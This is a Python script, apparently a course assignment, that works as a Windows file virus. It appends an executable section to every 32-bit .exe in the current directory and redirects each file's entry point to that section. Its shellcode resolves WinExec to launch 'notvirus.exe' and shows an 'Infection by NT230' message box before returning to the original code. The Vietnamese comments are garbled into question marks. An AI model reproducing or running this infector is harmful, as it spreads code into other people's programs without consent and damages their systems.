import pefile
from os import listdir, getcwd
from os.path import isfile, join
from struct import pack


def align(size, align):
	if size % align: 
		size = ((size + align) // align) * align
	return size

def findMsgBox(pe):
	for entry in pe.DIRECTORY_ENTRY_IMPORT:
		dll_name = entry.dll.decode('utf-8')
		if dll_name == "USER32.dll":
			for func in entry.imports:
				if func.name.decode('utf-8') == "MessageBoxW":
					# print("Found \t%s at 0x%08x" % (func.name.decode('utf-8'), func.address))
					return func.address

def generatePayload(msgBoxOff, oep, captionOff, textOff, Size):
	'''
	caption: Infetion by NT230: 
	\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20
	\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00\x32\x00\x33\x00\x30\x00\x00\x00
	text: 19521044_19521190_19520588: 
	\x31\x00\x39\x00\x35\x00\x32\x00\x31\x00\x30\x00\x34\x00\x34\x00\x5F\x00\x31\x00\x39\x00\x35\x00\x32\x00
	\x31\x00\x31\x00\x39\x00\x30\x00\x5F\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x35\x00\x38\x00\x38
	'''

	shellcodeToSpread = b'\x50\x53\x51\x52\x56\x57\x55\x89\xE5\x83\xEC\x18\x31\xF6\x66\x56\x6A\x63\x66\x68\x78\x65\x68\x57\x69\x6E\x45\x89\x65\xFC\x31\xF6\x64\x8B\x5E\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x26\xEB\x2B\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x69\x72\x75\x73\x68\x6E\x6F\x74\x76\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x46\x5D\x5F\x5E\x5A\x59\x5B\x58'
	
	capLittle = captionOff.to_bytes(4, 'little')
	textLittle = textOff.to_bytes(4, 'little')
	msgBoxLittle = msgBoxOff.to_bytes(4, 'little')
	oepLittle = oep.to_bytes(4, byteorder='little', signed=True)

	payload = shellcodeToSpread
	payload += b'\x6a\x00\x68'+ capLittle+ b'\x68' + textLittle + b'\x6a\x00\xff\x15'+ msgBoxLittle +b'\xe9'+ oepLittle +b'\x00\x00\x00\x00\x00\x00\x00'
	payload += b'\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00'
	payload += b'\x32\x00\x33\x00\x30\x00\x00\x00\x31\x00\x39\x00\x35\x00\x32\x00\x31\x00\x30\x00\x34\x00\x34\x00\x5F\x00\x31\x00\x39\x00'
	payload += b'\x35\x00\x32\x00\x31\x00\x31\x00\x39\x00\x30\x00\x5F\x00\x31\x00\x39\x00\x35\x00\x32\x00\x30\x00\x35\x00\x38\x00\x38'
	# print(payload)

	dataOfNewSection = bytearray(Size)
	for i in range(len(payload)):
		dataOfNewSection[i]=payload[i]
	return payload

def createNewSection(pe):
	# l???y section cu???i
	lastSection = pe.sections[-1]
	# t???o 1 ?????i t?????ng section m???i theo c???u tr??c Section c???a file pe mu???n l??y nhi???m
	newSection = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
	# cho d??? li???u c???a section m???i t???o n??y m???c ?????nh b???ng null h???t
	newSection.__unpack__(bytearray(newSection.sizeof()))

	# ?????t section header n???m ngay sau section header cu???i c??ng(gi??? s??? c?? ????? kho???ng tr???ng)
	newSection.set_file_offset(lastSection.get_file_offset() + lastSection.sizeof())
	# g??n t??n Section m???i l?? .test
	newSection.Name = b'.test'
	# cho section m???i c?? k??ch th?????c 100 byte
	newSectionSize = 200
	newSection.SizeOfRawData = align(newSectionSize, pe.OPTIONAL_HEADER.FileAlignment)
	# g??n raw address cho section m???i
	newSection.PointerToRawData = len(pe.__data__)
	# print("New section raw address is 0x%08x" % (newSection.PointerToRawData))
	# g??n k??ch th?????c cho Virtual Address c???a section m???i
	newSection.Misc = newSection.Misc_PhysicalAddress = newSection.Misc_VirtualSize = newSectionSize
	# g??n ?????a ch??? ???o cho section m???i
	newSection.VirtualAddress = lastSection.VirtualAddress + align(lastSection.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)
	# print("New section virtual address is 0x%08x" % (newSection.VirtualAddress))
	newSection.Characteristics = 0xE0000040 # gi?? tr??? c??? cho ph??p read | execute | code

	return newSection

def appendPayload(filePath):
	pe = pefile.PE(filePath)
	# print("\n------------Infecting " + filePath + "------------\n")
	# t???o section m???i
	newSection = createNewSection(pe)
	# l???y ?????a ch??? c???a h??m MessageBoxW ???????c import v??o
	msgBoxOff = findMsgBox(pe)

	# t??nh VA c???a caption v?? text theo c??ng th???c RA ??? Section RA = VA ??? Section VA
	captionOff = 0xCD + newSection.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
	textOff = 0xF3 + newSection.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase

	# t??nh relative virtual address c???a OEP ????? s??? d???ng n?? v???i l???nh jump quay l???i ban ?????u
	oldEntryPointVA = pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase
	newEntryPointVA =  newSection.VirtualAddress+ pe.OPTIONAL_HEADER.ImageBase
	jmp_instruction_VA = newEntryPointVA + 0x14 + 0xad

	RVA_oep = oldEntryPointVA - 5 - jmp_instruction_VA

	# t???o payload ???ng v???i c??c ?????a ch??? v???a m???i t??nh
	payload = generatePayload(msgBoxOff, RVA_oep, captionOff, textOff, newSection.SizeOfRawData)

	# t???o 1 ?????i t?????ng bytearray ????? l??u payload
	dataOfNewSection = bytearray(newSection.SizeOfRawData)
	for i in range(len(payload)):
		dataOfNewSection[i]=payload[i]

	# ??i???u ch???nh Entry Point
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = newSection.VirtualAddress

	# T??ng k??ch th?????c Size of Image th??m 100
	pe.OPTIONAL_HEADER.SizeOfImage += align(200, pe.OPTIONAL_HEADER.SectionAlignment)

	# t??ng s??? l?????ng section
	pe.FILE_HEADER.NumberOfSections += 1

	# th??m section m???i v??o sau file
	pe.sections.append(newSection)
	pe.__structures__.append(newSection)

	# th??m d??? li???u c???a section m???i v??o v??ng section m???i th??m v??o
	pe.__data__ = bytearray(pe.__data__) + dataOfNewSection
	# ghi d??? li???u v?? ????ng file
	pe.write(filePath)
	pe.close()
	# print(filePath + " was infected.")


if __name__ == '__main__':
	# l???y ???????ng d???n th?? m???c hi???n t???i
	current_dir = getcwd()
	# l???y t??n t???ng file exe trong th?? m???c hi???n t???i
	files_name = [f for f in listdir(current_dir) if (isfile(join(current_dir, f))&f.endswith(".exe")&(f!="run.exe"))]
	for file in files_name:
		# x??c ?????nh t??n c???a section cu???i c?? ph???i l?? .test hay kh??ng
		pe = pefile.PE(file)
		lastSection = pe.sections[-1]
		lastSectionName = lastSection.Name.decode('UTF-8').rstrip('\x00')
		pe.close()

		if pe.FILE_HEADER.Machine == 0x8664:
			# print(file + " is 64-bit => cannot infect")
			continue
		elif lastSectionName == ".test":
			# print(file + " have " + lastSectionName + " section => no need to infect")
			continue
		else:
			# print(file + " need to infect")
			appendPayload(file)
